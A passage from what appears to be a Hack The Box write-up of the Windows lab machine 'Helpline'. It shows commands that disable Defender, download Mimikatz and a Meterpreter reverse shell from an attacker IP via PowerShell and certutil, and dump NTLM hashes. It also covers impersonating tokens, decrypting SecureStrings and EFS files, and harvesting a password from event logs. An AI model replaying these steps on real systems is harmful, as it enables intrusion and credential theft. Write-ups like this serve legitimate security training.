  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\tolu\Desktop&gt;type user.txt
Access is denied.

C:\Users\tolu\Desktop&gt;cipher /c user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
</code></pre></div></div>

<p>Next, I disabled the AV running on the system so I could execute Mimikatz and get the NTLM hashes and psexec back in later.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS E:\ManageEngine\ServiceDesk\integration\custom_scripts&gt; set-mppreference -disablerealtimemonitoring $true
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\programdata&gt; invoke-webrequest -uri http://10.10.14.23/mimikatz.exe -outfile mimikatz.exe

lsadump::lsa /patch
mimikatz # Domain : HELPLINE / S-1-5-21-3107372852-1132949149-763516304

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : d5312b245d641b3fae0d07493a022622

RID  : 000003e8 (1000)
User : alice
LM   :
NTLM : 998a9de69e883618e987080249d20253

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003f1 (1009)
User : leo
LM   :
NTLM : 60b05a66232e2eb067b973c889b615dd

RID  : 000003f2 (1010)
User : niels
LM   :
NTLM : 35a9de42e66dcdd5d512a796d03aef50

RID  : 000003f3 (1011)
User : tolu
LM   :
NTLM : 03e2ec7aa7e82e479be07ecd34f1603b

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 52a344a6229f7bfa074d3052023f0b41

RID  : 000003ef (1007)
User : zachary
LM   :
NTLM : eef285f4c800bcd1ae1e84c371eeb282
</code></pre></div></div>

<h3 id="get-access-to-leos-admin-password-list">Get access to Leo’s admin password list</h3>

<p>I found a <code class="language-plaintext highlighter-rouge">admin-pass.xml</code> file in Leo’s Desktop directory but I can’t read it because it’s EFS encrypted:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\leo\Desktop&gt;type admin-pass.xml
Access is denied.

C:\Users\leo\Desktop&gt;cipher /c admin-pass.xml
cipher /c admin-pass.xml

 Listing C:\Users\leo\Desktop\
 New files added to this directory will not be encrypted.

E admin-pass.xml
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\leo [leo(leo@HELPLINE)]
    Certificate thumbprint: 66E4 033A 6EEE 1414 7D7D 9F97 6E5C D1D5 20B0 24B8
</code></pre></div></div>

<p>There’s also a <code class="language-plaintext highlighter-rouge">run.ps1</code> file in the Documents folder so I assume there is some kind of scheduled job running with Leo’s credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Directory of C:\Users\leo\Documents

12/27/2018  12:06 AM    &lt;DIR&gt;          .
12/27/2018  12:06 AM    &lt;DIR&gt;          ..
12/27/2018  08:54 PM               462 run.ps1
</code></pre></div></div>

<p>I used meterpreter with the incognito module to see the tokens present in memory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\ProgramData&gt;certutil -f -urlcache http://10.10.14.23/met.exe met.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\ProgramData&gt;met
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) &gt; run -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.23:7777

msf5 exploit(multi/handler) &gt; sessions 2
[*] Starting interaction with 2...

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; load incognito
Loading extension incognito...Success.

meterpreter &gt; list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
HELPLINE\alice
HELPLINE\leo
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
</code></pre></div></div>

<p>We see that Leo’s token is in memory so we can impersonate him and download the <code class="language-plaintext highlighter-rouge">admin-pass.xml</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; impersonate_token helpline\\leo
[+] Delegation token available
[+] Successfully impersonated user HELPLINE\leo

meterpreter &gt; shell
Process 4428 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\ProgramData&gt;whoami
whoami
helpline\leo

C:\Users\leo\Desktop&gt;type admin-pass.xml
type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
</code></pre></div></div>

<p>This looks like a Powershell SecureString. Looking at <a href="https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text">https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text</a> we can find a method to decrypt the SecureString and recover the plaintext. Since we are running with Leo’s token, we already have the decryption key loaded in memory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\leo\Desktop&gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\leo\Desktop&gt; whoami
whoami
helpline\leo
PS C:\Users\leo\Desktop&gt;

PS C:\Users\leo\Desktop&gt; $SecurePassword = Get-Content admin-pass.xml | ConvertTo-SecureString
PS C:\Users\leo\Desktop&gt; $UnsecurePassword = (New-Object PSCredential "administrator",$SecurePassword).GetNetworkCredential().Password
PS C:\Users\leo\Desktop&gt; echo $UnsecurePassword

mb@letmein@SERVER#acc
</code></pre></div></div>

<p>We just found the administrator’s password: <code class="language-plaintext highlighter-rouge">mb@letmein@SERVER#acc</code></p>

<h3 id="decrypting-the-roottxt-flag">Decrypting the root.txt flag</h3>

<p>Now that we have plaintext password for <code class="language-plaintext highlighter-rouge">administrator</code>, we can use Mimikatz to decrypt the master key and recover the private key for the administrator user.</p>

<p>I followed the <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</a> guide for this part.</p>

<p>Step 1. Get the certificate</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3" /export
[...]
Saved to file: FB154575993A250FE826DBAC79EF26C211CB77B3.der
</code></pre></div></div>

<p>Step 2. Decrypt the master key</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::masterkey /in:"C:\users\administrator\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687" /pass:mb@letmein@SERVER#acc
[...]
[masterkey] with password: mb@letmein@SERVER#acc (normal user)
key : 8ed6519c4d09a506504c4f611203bea8979a385f8a444fe57b5d2256ee1e4eb34392a141f502cd9aeea8d2187c2525c3ae998dc3cebad81cc4e41dbb6bc65fa8
sha1: b18974052cb509a86a008869fd95388550678184
</code></pre></div></div>

<p>Step 3. Decrypt the private key</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85" /masterkey:b18974052cb509a86a008869fd95388550678184
[...]
Exportable key : YES
Key size       : 2048
Private export : OK - 'raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk'
</code></pre></div></div>

<p>Step 4. Build &amp; import the correct PFX</p>

<p>I downloaded the files to my Kali VM then used the following commands to build the PFX file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -inform DER -outform PEM -in FB154575993A250FE826DBAC79EF26C211CB77B3.der -out public.pem
openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre></div></div>

<p>Next, I uploaded the <code class="language-plaintext highlighter-rouge">cert.pfx</code> file to the target box.</p>

<p>Step 5. Get the flag</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\ProgramData&gt;certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "Administrator" added to store.

CertUtil: -importPFX command completed successfully.

C:\ProgramData&gt;type c:\users\administrator\desktop\root.txt
d8142...
</code></pre></div></div>

<h3 id="looking-for-the-tolu-user-password">Looking for the tolu user password</h3>

<p>I downloaded all the Windows log files from <code class="language-plaintext highlighter-rouge">c:\windows\system32\winevt\logs</code> to my Kali VM and used the following Python module to parse them <a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># evtx_dump.py Security.evtx | grep tolu
&lt;EventData&gt;&lt;Data Name="TargetUserName"&gt;tolu&lt;/Data&gt;
&lt;EventData&gt;&lt;Data Name="TargetUserName"&gt;tolu&lt;/Data&gt;
&lt;Data Name="CommandLine"&gt;"C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99&lt;/Data&gt;
</code></pre></div></div>

<p>The log file contains the <code class="language-plaintext highlighter-rouge">tolu</code> user password: <code class="language-plaintext highlighter-rouge">!zaq1234567890pl!99</code></p>

<p>Now we can repeat the same Mimikatz process for this user and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\ProgramData&gt;certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "tolu" added to store.

CertUtil: -importPFX command completed successfully.

C:\ProgramData&gt;type c:\users\tolu\desktop\user.txt
0d522f...
</code></pre></div></div>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#efs" class="page__taxonomy-item" rel="tag">efs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#evtx" class="page__taxonomy-item" rel="tag">evtx</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#incognito" class="page__taxonomy-item" rel="tag">incognito</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">lfi</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#meterpreter" class="page__taxonomy-item" rel="tag">meterpreter</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#mimikatz" class="page__taxonomy-item" rel="tag">mimikatz</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#postgresql" class="page__taxonomy-item" rel="tag">postgresql</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">powershell</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#servicedesk" class="page__taxonomy-item" rel="tag">ServiceDesk</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tokens" class="page__taxonomy-item" rel="tag">tokens</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows-logs" class="page__taxonomy-item" rel="tag">windows logs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#winrm" class="page__taxonomy-item" rel="tag">winrm</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">xxe</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-08-17T00:00:00+02:00">August 17, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-arkham/" class="pagination--pager" title="Arkham - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-unattended/" class="pagination--pager" title="Unattended - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
